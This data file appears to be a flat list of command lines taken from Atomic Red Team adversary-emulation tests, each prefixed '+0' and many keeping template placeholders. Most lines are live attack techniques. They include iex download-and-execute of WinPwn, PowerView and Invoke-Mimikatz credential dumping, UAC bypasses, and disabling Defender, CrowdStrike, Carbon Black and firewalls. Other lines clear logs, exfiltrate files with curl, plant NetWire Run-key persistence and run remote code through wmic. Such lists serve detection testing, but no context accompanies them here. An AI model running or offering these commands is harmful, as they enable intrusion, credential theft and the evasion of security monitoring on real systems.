+0	(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Generalrecon -consoleoutput -noninteractive
+0	cat /dev/null > /var/log/messages #truncating the file to zero bytes&&cat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)
+0	osascript -e 'do shell script "rm #{system_log_path}" with administrator privileges'
+0	New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
+0	New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command_to_execute}';New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute";Start-Process -FilePath $env:windir\system32\sdclt.exe;Start-Sleep -s 3
+0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+0	echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules&&grep "# THIS IS A COMMENT" /etc/ufw/user.rules
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
+0	truncate -s 0 /var/log/messages #size parameter shorthand&&truncate --size=0 /var/log/security #size parameter 
+0	nltest.exe /dclist:#{target_domain}
+0	([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
+0	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');Invoke-Seatbelt -Command "-group=all"; pause
+0	echo 1> /proc/sys/kernel/sysrq &&echo b> /proc/sysrq-trigger 
+0	Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+0	Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+0	cd "PathToAtomicsFolder\..\ExternalPayloads";.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} "PathToAtomicsFolder\..\ExternalPayloads\username.txt"
+0	sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist&&sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force;New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+0	"#{uacme_exe}"
+0	systemctl stop ufw
+0	cscript "#{vbscript}"
+0	sudo rm -rf #{syslog_path}&&if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi
+0	reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f;reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f;fodhelper.exe
+0	powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+0	& "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
+0	Invoke-Expression "#{adrecon_path}"
+0	REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
+0	New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force
+0	sudo truncate -s 0 #{system_log_path} #size parameter shorthand&&sudo truncate --size=0 #{system_log_path} #size parameter 
+0	Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      ;$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password;Connect-AzAccount -Credential $Credential;Connect-AzureAD -Credential $Credential;Scan-AzureAdmins -UseCurrentCred
+0	"#{venv_path}\Scripts\adidnsdump" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
+0	$excludedExts= "#{excluded_exts}";Add-MpPreference -ExclusionExtension  $excludedExts
+0	reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 0 /F;reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 0 /F
+0	reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
+0	"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
+0	if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+0	sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+0	#{curl_path} -T #{file_path} #{remote_destination};#{curl_path} --upload-file #{file_path} #{remote_destination};#{curl_path} -d #{file_path} #{remote_destination};#{curl_path} --data #{file_path} #{remote_destination}
+0	finger base64_filedata@#{remote_host}
+0	for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
+0	echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf&&grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+0	# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team"";reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f;iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+0	#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll;#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll;#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll;#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
+0	sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+0	scp #{username}@#{remote_host}:#{remote_file} #{local_path}
+0	sudo log -f /var/log/system.log | : > /var/log/system.log
+0	del %TEMP%\PrintBrm.zip >nul 2>&1 ;#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
+0	scp #{local_file} #{username}@#{remote_host}:#{remote_path}
+0	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d 10 /f;reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d 10 /f
+0	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
+0	if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi&&if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi&&if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi&&if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi&&if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi&&if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi&&if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi&&if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
+0	sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content&&sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place
+0	sudo lsmod | grep -i "vboxsf\|vboxguest"&&sudo lsmod | grep -i "vmw_baloon\|vmxnet"&&sudo lsmod | grep -i "xen-vbd\|xen-vnif"&&sudo lsmod | grep -i "virtio_pci\|virtio_net"&&sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
+0	timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
+0	rm -rf /var/log/messages&&rm -rf /var/log/security
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 0 /f
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist
+0	iptables-save > /tmp/iptables.rules&&iptables -F
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
+0	powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+0	reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d "C:\Users\admin\AppData\Roaming\Install\Host.exe" /f;reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f;reg add HKCU\SOFTWARE\NetWire /v "Install Date" /t REG_SZ /d "2021-08-30 07:17:27" /f
+0	$machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt";$offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt";$completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt";foreach ($machine in get-content -path "$machine_list");{if (test-connection -Count 1 -computername $machine -quiet) ;{cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}";echo $machine >> "$completed_list";wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"};else;{echo $machine >> "$offline_list"}}
+0	echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf&&grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
+0	Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *
+0	$excludedpath= "#{excluded_folder}";Add-MpPreference -ExclusionPath $excludedpath
+0	wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"ATOMICREDTEAM\"
+0	reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f;reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1
+0	reg add "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
+0	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f;reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d "regedit.exe";reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d "cmd.exe"
+0	netsh advfirewall set currentprofile state off
+0	Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
+0	Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand';Invoke-Expression $streamcommand
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Morerecon -noninteractive -consoleoutput
+0	for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  
+0	New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value Administrator -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Value contoso.com -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword  -Value password1 -Force
+0	sudo srm #{system_log_path} #system log file deletion&&sudo srm -r #{system_log_folder} #recursive deletion of log files
+0	Get-AdComputer -Filter *
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');RBCD-Check -consoleoutput -noninteractive
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f
+0	cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f;cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f;cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
+0	sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes&&sudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)
+0	service pf stop&&service pf disable
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');winPEAS -noninteractive -consoleoutput
+0	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
+0	Stop-Service -Name #{service_name};Remove-Service -Name #{service_name}
+0	"#{uacme_exe}"
+0	sudo spctl --master-disable
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');otherchecks -noninteractive -consoleoutput
+0	system_profiler&&ls -al /Applications
+0	hostname
+0	tail /var/log/ufw.log
+0	"#{uacme_exe}"
+0	Copy-Item "#{exe_file_path}" -Destination "C:\Users\$env:UserName" -Force;netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+0	rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
+0	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
